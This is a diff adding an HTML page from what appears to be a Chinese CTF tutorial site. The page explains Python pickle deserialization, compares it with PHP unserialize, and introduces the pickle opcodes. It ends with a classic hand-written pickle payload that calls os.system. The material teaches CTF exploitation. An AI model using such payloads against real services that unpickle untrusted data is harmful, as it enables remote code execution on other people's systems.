@@ -1,0 +1,1630 @@
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh" dir="ltr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+    <title>Python反序列化 | Hello CTF</title>
+  
+  <meta name="description" content="开源免费、新手友好的CTF(Capture The Flag,夺旗赛)入门教程">
+  <link rel="icon" href="../../assets/images/favicon.png">
+
+  <!-- 字体（与首页同源） -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Noto+Sans+SC:wght@400;500;700;800&display=swap" rel="stylesheet">
+
+  <!-- material 文章排版 CSS（pin 9.7.7 的 hash 文件名，升级主题时同步更新） -->
+  <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
+  <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+
+  <!-- Hello-CTF 外壳 -->
+  <link rel="stylesheet" href="../../shell/shell.css">
+  <link rel="stylesheet" href="../../shell/shell-docs.css">
+  <link rel="stylesheet" href="../../shell/shell-article.css">
+
+  <!-- 站点原有 extra_css（katex CDN / extra.css / bannerSlider.css 等） -->
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.css">
+  
+    <link rel="stylesheet" href="../../stylesheets/extra.css">
+  
+
+  <!-- admonition 等组件的图标 SVG 变量（原由 material base.html 注入） -->
+  
+
+
+
+  
+  
+  
+
+<script id="__analytics">function __md_analytics(){function e(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],e("js",new Date),e("config","G-V9998CDNR1"),document.addEventListener("DOMContentLoaded",(function(){document.forms.search&&document.forms.search.query.addEventListener("blur",(function(){this.value&&e("event","search",{search_term:this.value})}));document$.subscribe((function(){var t=document.forms.feedback;if(void 0!==t)for(var a of t.querySelectorAll("[type=submit]"))a.addEventListener("click",(function(a){a.preventDefault();var n=document.location.pathname,d=this.getAttribute("data-md-value");e("event","feedback",{page:n,data:d}),t.firstElementChild.disabled=!0;var r=t.querySelector(".md-feedback__note [data-md-value='"+d+"']");r&&(r.hidden=!1)})),t.hidden=!1})),location$.subscribe((function(t){e("config","G-V9998CDNR1",{page_path:t.pathname})}))}));var t=document.createElement("script");t.async=!0,t.src="https://www.googletagmanager.com/gtag/js?id=G-V9998CDNR1",document.getElementById("__analytics").insertAdjacentElement("afterEnd",t)}</script>
+</head>
+<body data-md-color-scheme="default">
+
+  <!-- 主题初始化（先于渲染，避免闪烁）：hc-theme → shell data-theme + material slate -->
+  <script>
+    (function () {
+      var t = null;
+      try { t = localStorage.getItem("hc-theme"); } catch (e) {}
+      if (t) {
+        document.documentElement.dataset.theme = t;
+        document.body.setAttribute("data-md-color-scheme", t === "dark" ? "slate" : "default");
+      }
+    })();
+    window.__md_palette_sync = function (t) {
+      document.body.setAttribute("data-md-color-scheme", t === "dark" ? "slate" : "default");
+    };
+  </script>
+
+  <script src="../../shell/search.js"></script>
+  <script src="../../shell/shell.js"></script>
+  <script>Shell.mount({ active: "" });</script>
+
+  <!-- 主区：顶部文档导航 + 文章 + TOC -->
+  <div class="main">
+    <nav class="hc-topnav" aria-label="文档导航">
+      <div class="hc-topnav-inner">
+        
+          
+          
+            <a class="tn-item tn-single" href="../../hc-start/"><svg class="ic tn-ico"><use href="#i-book"/></svg>快速开始</a>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-book"/></svg>前言<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-preface/">前言</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-preface/about/">关于本书</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-preface/usage/">食用方法</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-preface/join/">加入我们</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-puzzle"/></svg>MISC<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-misc/">MISC | 杂项</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/osint/">信息收集</a>
+    
+  
+    
+      <div class="tn-group">文件与编码基础</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-misc/Encode_extra/">编码扩展</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/file/">文件基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/Archivefile/">压缩包</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">隐写分析</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-misc/stego/">图片隐写</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/file_stego/">文件隐写</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/audio_stego/">音频隐写</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">取证分析</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-misc/pcap/">流量分析</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/memory/">内存取证</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/industrial/">工控类</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/file_sign/">附:文件签名表</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item on">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-globe"/></svg>Web<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../">Web | 网络攻防</a>
+    
+  
+    
+      <div class="tn-group">环境与工具</div>
+      
+  
+    
+      <a class="tn-link" href="../web_env/">Web环境设置</a>
+    
+  
+    
+      <a class="tn-link" href="../docker_install/">Docker安装配置</a>
+    
+  
+    
+      <a class="tn-link" href="../docker_env/">Docker与漏洞环境</a>
+    
+  
+    
+      <a class="tn-link" href="../vm_lab/">虚拟机与网络模拟</a>
+    
+  
+    
+      <a class="tn-link" href="../burp/">Burp Suite</a>
+    
+  
+    
+      <a class="tn-link" href="../py_script/">Python脚本</a>
+    
+  
+    
+      <a class="tn-link" href="../http/">HTTP协议</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../web_start/">Web入门题单</a>
+    
+  
+    
+      <div class="tn-group">信息收集</div>
+      
+  
+    
+      <a class="tn-link" href="../sensitive_info/">敏感信息泄露</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">PHP专题</div>
+      
+  
+    
+      <a class="tn-link" href="../php_features/">PHP特性与常见绕过</a>
+    
+  
+    
+      <a class="tn-link" href="../php_basic/">PHP基础</a>
+    
+  
+    
+      <a class="tn-link" href="../php_unser/">PHP反序列化</a>
+    
+  
+    
+      <a class="tn-link" href="../php_code_audit/">PHP代码审计</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">注入类漏洞</div>
+      
+  
+    
+      <a class="tn-link" href="../sql_injection/">SQL注入</a>
+    
+  
+    
+      <a class="tn-link" href="../nosql/">NoSQL注入</a>
+    
+  
+    
+      <a class="tn-link" href="../xss/">XSS攻击</a>
+    
+  
+    
+      <a class="tn-link" href="../csrf/">CSRF攻击</a>
+    
+  
+    
+      <a class="tn-link" href="../ssti/">SSTI注入</a>
+    
+  
+    
+      <a class="tn-link" href="../xxe/">XXE注入</a>
+    
+  
+    
+      <a class="tn-link" href="../ssrf/">SSRF注入</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">文件类漏洞</div>
+      
+  
+    
+      <a class="tn-link" href="../file_upload/">文件上传</a>
+    
+  
+    
+      <a class="tn-link" href="../include/">文件包含</a>
+    
+  
+    
+      <a class="tn-link" href="../dir_traversal/">目录穿越</a>
+    
+  
+    
+      <a class="tn-link" href="../any_file_read/">任意文件读取</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">命令与代码执行</div>
+      
+  
+    
+      <a class="tn-link" href="../rce/">RCE</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../session_jwt/">会话与认证安全</a>
+    
+  
+    
+      <a class="tn-link" href="../logical_vuln/">逻辑漏洞</a>
+    
+  
+    
+      <div class="tn-group">语言扩展 | 世界不止有PHP</div>
+      
+  
+    
+      <a class="tn-link on" href="./">Python反序列化</a>
+    
+  
+    
+      <a class="tn-link" href="../py_sandbox/">Python沙箱逃逸</a>
+    
+  
+    
+      <a class="tn-link" href="../flask_sec/">Flask安全</a>
+    
+  
+    
+      <a class="tn-link" href="../prototype_pollution/">原型链污染</a>
+    
+  
+    
+      <a class="tn-link" href="../js_sandbox/">JS沙箱逃逸</a>
+    
+  
+    
+      <a class="tn-link" href="../js_reverse/">JS逆向</a>
+    
+  
+    
+      <a class="tn-link" href="../java_basic/">Java安全基础</a>
+    
+  
+    
+      <a class="tn-link" href="../java_unser/">Java反序列化</a>
+    
+  
+    
+      <a class="tn-link" href="../spring/">Spring漏洞</a>
+    
+  
+    
+      <a class="tn-link" href="../java_audit/">Java代码审计</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">进阶专题</div>
+      
+  
+    
+      <a class="tn-link" href="../waf_bypass/">WAF绕过</a>
+    
+  
+    
+      <a class="tn-link" href="../http_smuggling/">请求走私</a>
+    
+  
+    
+      <a class="tn-link" href="../cache_poisoning/">缓存投毒</a>
+    
+  
+    
+      <a class="tn-link" href="../xs_leaks/">XS-Leaks</a>
+    
+  
+    
+      <a class="tn-link" href="../web_crypto/">密码学应用题</a>
+    
+  
+    
+      <a class="tn-link" href="../cloud_container/">云与容器安全</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">实战能力</div>
+      
+  
+    
+      <div class="tn-group">渗透链路基础</div>
+      
+  
+    
+      <a class="tn-link" href="../pentest_flow/">渗透流程总览</a>
+    
+  
+    
+      <a class="tn-link" href="../two_layer/">两层网络实战</a>
+    
+  
+    
+      <a class="tn-link" href="../foothold/">立足点建立</a>
+    
+  
+    
+      <a class="tn-link" href="../internal_recon/">内网信息收集</a>
+    
+  
+    
+      <a class="tn-link" href="../proxy_tunnel/">代理与隧道</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">多层网络渗透</div>
+      
+  
+    
+      <a class="tn-link" href="../three_layer/">三层网络实战</a>
+    
+  
+    
+      <a class="tn-link" href="../multi_layer/">多层网络综合</a>
+    
+  
+    
+      <a class="tn-link" href="../ad_basic/">域渗透入门</a>
+    
+  
+    
+      <a class="tn-link" href="../lateral/">横向移动</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">对抗与综合</div>
+      
+  
+    
+      <a class="tn-link" href="../awd/">AWD模式</a>
+    
+  
+    
+      <a class="tn-link" href="../web_pwn/">Web与二进制结合</a>
+    
+  
+    
+      <a class="tn-link" href="../nday/">Nday利用</a>
+    
+  
+    
+      <a class="tn-link" href="../review/">Writeup复盘方法</a>
+    
+  
+
+    
+  
+
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-lock"/></svg>Crypto<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-crypto/">Crypto | 密码学</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/env/">环境配置</a>
+    
+  
+    
+      <div class="tn-group">基础知识</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Recap/">前情提要</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Encode/">编码基础</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">密码体系</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Classicalcipher/">古典密码</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Moderncipher/">现代密码</a>
+    
+  
+
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-cpu"/></svg>Reverse<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-reverse/">逆向工程</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%BC%95%E5%AF%BC%E7%AF%87%EF%BC%9A%E7%81%B5%E9%AD%82FAQ/">引导篇：灵魂FAQ</a>
+    
+  
+    
+      <div class="tn-group">编译与可执行文件</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/">C语言基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84/">存储结构</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Quick%20Start%EF%BC%9A%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/">可执行文件</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">交互式反汇编工具IDA</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/StartWithIDA/">从零开始的IDA</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/IDA%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/">IDA动态调试</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">常见算法</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%9F%BA%E6%9C%AC%E8%BF%90%E7%AE%97/">基本运算</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E7%BC%96%E7%A0%81%E5%9F%BA%E7%A1%80/">编码基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%AD%97%E8%8A%82%E6%B5%81%E7%AE%97%E6%B3%95/">字节流算法</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81/">分组密码</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/z3%E7%BA%A6%E6%9D%9F%E6%B1%82%E8%A7%A3/">z3约束求解</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Quick%20Start%EF%BC%9AASM%E6%B1%87%E7%BC%96/">x86 汇编初步</a>
+    
+  
+    
+      <div class="tn-group">代码保护与对抗</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E8%8A%B1%E6%8C%87%E4%BB%A4/">花指令</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E5%A3%B3/">加壳</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/VM/">VM</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/SMC/">SMC</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/">异常处理</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%A4%9A%E7%BA%BF%E7%A8%8B/">多线程</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/">TLS回调函数</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%8F%8D%E8%B0%83%E8%AF%95/">反调试</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/">控制流平坦化</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/">符号执行</a>
+    
+  
+    
+      <div class="tn-group">语言与框架</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Python/">Python</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/NET/">.NET</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Rust/">Rust</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/JavaScript/">JavaScript</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Android/">Android平台</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E8%A7%A3%E9%A2%98%E6%8A%80%E5%B7%A7/">解题技巧</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-terminal"/></svg>Pwn<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-pwn/">Pwn | 二进制安全</a>
+    
+  
+    
+      <div class="tn-group">环境与基础</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-pwn/wsl2_environment/">wsl2下的环境配置</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/Asm_x86/">汇编语言(x86)</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/Protections/">常见保护</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">栈溢出</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-pwn/Stack_Overflow/">栈上数组越界&栈溢出</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">ROP利用</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-pwn/ROP/">ROP入门</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/ROP_Tricks/">常见的ROP技巧</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/rop_add_v1/">ROP进阶</a>
+    
+  
+
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-shield"/></svg>AWD<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_about/">AWD介绍</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_platform/">AWD平台</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_web.exp/">【WEB】AWD技巧</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_pwn.exp/">【PWN】AWD技巧</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-bot"/></svg>AI<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-ai/">AI | 人工智能</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-ai/What_is_AI/">初识AI</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-ai/MLP/">你的第一个神经网络</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-link"/></svg>区块链<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <div class="tn-group">Move</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x00/">从0开始的签到题</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x01/">独特的所有权</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x02/">神奇的时钟</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x03/">对象与燃气</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x04/">多样的泛型</a>
+    
+  
+
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-tag"/></svg>附录<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-appendix/how-to-ask/">提问的智慧</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-appendix/NSSCTF_Usage/">NSSCTF平台使用</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-appendix/book/">推荐书单</a>
+    
+  
+</div>
+            </div>
+          
+        
+      </div>
+    </nav>
+    <div class="doc-layout">
+      <article class="md-typeset hc-article">
+        <!-- Tags -->
+
+
+<!-- Actions -->
+<!-- Actions -->
+
+
+  <!-- Edit button -->
+  
+
+  <!-- View button -->
+  
+
+
+<!-- Page content -->
+<div><h1 id="python">Python反序列化<a class="headerlink" href="#python" title="Permanent link">¶</a></h1>
+<h2 id="php">从 PHP 反序列化迁移过来<a class="headerlink" href="#php" title="Permanent link">¶</a></h2>
+<p>如果你已经学过 <a href="../php_unser/">PHP反序列化</a>，那么这一章会非常快，因为两者的漏洞模型几乎一一对应：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>PHP</th>
+<th>Python</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>序列化函数</td>
+<td><code>serialize()</code></td>
+<td><code>pickle.dumps()</code></td>
+</tr>
+<tr>
+<td>反序列化函数</td>
+<td><code>unserialize()</code></td>
+<td><code>pickle.loads()</code></td>
+</tr>
+<tr>
+<td>序列化结果</td>
+<td>文本字符串（<code>O:4:"User":...</code>）</td>
+<td>二进制字节流（栈式虚拟机的指令序列）</td>
+</tr>
+<tr>
+<td>可控的触发点</td>
+<td>魔术方法（<code>__wakeup</code>、<code>__destruct</code> 等）</td>
+<td><code>__reduce__</code> / <code>__reduce_ex__</code> 方法</td>
+</tr>
+<tr>
+<td>利用思路</td>
+<td>在题目已有的类里找 POP 链</td>
+<td>直接在 payload 里指定要调用的函数</td>
+</tr>
+</tbody>
+</table>
+<p>最大的区别在于：<strong>PHP 的 <code>unserialize()</code> 只是还原数据结构 **，要执行代码必须依赖题目代码里已存在的类和魔术方法，串出一条 POP 链；而</strong> pickle 的反序列化过程本身就是在一个虚拟机上逐条执行指令**，其中 <code>REDUCE</code> 这类指令的语义就是"调用某个函数"。也就是说，pickle 数据里可以直接携带"请调用 <code>os.system('xxx')</code>"这样的指令，不需要题目代码里存在任何可利用的类——只要服务端对用户输入调用了 <code>pickle.loads()</code>，天然就可能是 RCE。</p>
+<p>所以做 Python 反序列化题，核心工作通常不是"找链"，而是：</p>
+<ol>
+<li>找到 <code>pickle.loads()</code> 的入口和过滤条件；</li>
+<li>生成（或手写）一段能绕过过滤、执行命令的 pickle 数据。</li>
+</ol>
+<p>Python 官方文档对 <code>pickle</code> 的第一条警告就是："<strong>永远不要反序列化来自不可信来源的数据</strong>"。</p>
+<h2 id="pickle-opcode">pickle 协议与 opcode 极简入门<a class="headerlink" href="#pickle-opcode" title="Permanent link">¶</a></h2>
+<h3 id="_1">序列化结果长什么样<a class="headerlink" href="#_1" title="Permanent link">¶</a></h3>
+<p><code>pickle</code> 目前一共有 0～5 共 6 个协议版本，版本越高越紧凑，但 <strong>协议 0 是纯 ASCII 文本</strong>，人可以直接读写，CTF 里手写 payload 一般都用它：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">pickle</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="nb">print</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">([</span><span class="mi">1</span><span class="p">,</span> <span class="s1">'a'</span><span class="p">],</span> <span class="n">protocol</span><span class="o">=</span><span class="mi">0</span><span class="p">))</span>
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="c1"># b'(lp0\nI1\naVa\np1\na.'</span>
+</code></pre></div>
+<p>看不懂没关系，Python 自带 <code>pickletools</code> 模块可以把字节流反汇编成一条条指令（opcode）：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">pickle</span><span class="o">,</span><span class="w"> </span><span class="nn">pickletools</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="n">data</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">([</span><span class="mi">1</span><span class="p">,</span> <span class="s1">'a'</span><span class="p">],</span> <span class="n">protocol</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="n">pickletools</span><span class="o">.</span><span class="n">dis</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</code></pre></div>
+<p>输出：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>    0: (    MARK
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>    1: l        LIST       (MARK at 0)
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>    2: p    PUT        0
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>    5: I    INT        1
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>    8: a    APPEND
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>    9: V    UNICODE    'a'
+<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>   12: p    PUT        1
+<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>   15: a    APPEND
+<a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>   16: .    STOP
+<a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>highest protocol among opcodes = 0
+</code></pre></div>
+<h3 id="pickle">pickle 是一台栈式虚拟机<a class="headerlink" href="#pickle" title="Permanent link">¶</a></h3>
+<p>可以把 <code>pickle.loads()</code> 理解为一台小虚拟机的执行过程：它维护一个 <strong>栈</strong>，从左到右读取 opcode，逐条执行，直到遇到 <code>.</code>（STOP）时把栈顶元素作为反序列化的结果返回。反汇编上面那段数据，它做的事情是：</p>
+<ul>
+<li><code>(</code> 压入一个 MARK 标记；</li>
+<li><code>l</code> 弹出到 MARK 为止的内容，组装成 list；</li>
+<li><code>I1</code> 压入整数 1，<code>a</code> 把它追加到 list 里；</li>
+<li><code>Va</code> 压入字符串 <code>'a'</code>，再 <code>a</code> 追加；</li>
+<li><code>.</code> 结束，返回栈顶的 list。</li>
+</ul>
+<h3 id="opcode">够用的 opcode 清单<a class="headerlink" href="#opcode" title="Permanent link">¶</a></h3>
+<p>不需要背全部 opcode，做题只需要认识下面这几个：</p>
+<table>
+<thead>
+<tr>
+<th>opcode</th>
+<th>名称</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>c模块名\n函数名\n</code></td>
+<td>GLOBAL</td>
+<td>把"模块.函数"这个可调用对象压栈（protocol 0 写法）</td>
+</tr>
+<tr>
+<td><code>\x93</code></td>
+<td>STACK_GLOBAL</td>
+<td>从栈上弹出"函数名、模块名"两个字符串，压入对应的可调用对象（protocol 2+）</td>
+</tr>
+<tr>
+<td><code>(</code></td>
+<td>MARK</td>
+<td>压入一个标记</td>
+</tr>
+<tr>
+<td><code>S'xxx'\n</code> / <code>Vxxx\n</code></td>
+<td>STRING / UNICODE</td>
+<td>压入字符串（<code>V</code> 支持 <code>\uXXXX</code> 转义，后面绕过要用）</td>
+</tr>
+<tr>
+<td><code>I123\n</code></td>
+<td>INT</td>
+<td>压入整数</td>
+</tr>
+<tr>
+<td><code>t</code></td>
+<td>TUPLE</td>
+<td>弹出到 MARK 为止的内容，组成元组压栈</td>
+</tr>
+<tr>
+<td><code>R</code></td>
+<td>REDUCE</td>
+<td>弹出元组和可调用对象，执行 <code>callable(*args)</code>，结果压栈</td>
+</tr>
+<tr>
+<td><code>i模块名\n函数名\n</code></td>
+<td>INST</td>
+<td>类似 GLOBAL + REDUCE 的组合，直接调用</td>
+</tr>
+<tr>
+<td><code>o</code></td>
+<td>OBJ</td>
+<td>用 MARK 之后的内容构造对象</td>
+</tr>
+<tr>
+<td><code>b</code></td>
+<td>BUILD</td>
+<td>用栈顶 dict 更新对象的 <code>__dict__</code></td>
+</tr>
+<tr>
+<td><code>.</code></td>
+<td>STOP</td>
+<td>结束，栈顶就是反序列化结果</td>
+</tr>
+</tbody>
+</table>
+<p>关键就是 <code>R</code>：栈上放着"可调用对象"和"参数元组"，<code>R</code> 就把它们组合成一次真实的函数调用。一段最经典的手写 RCE opcode 长这样：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>cos
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>system
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>(S'echo pwned'
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>tR.
+</code></pre></div>
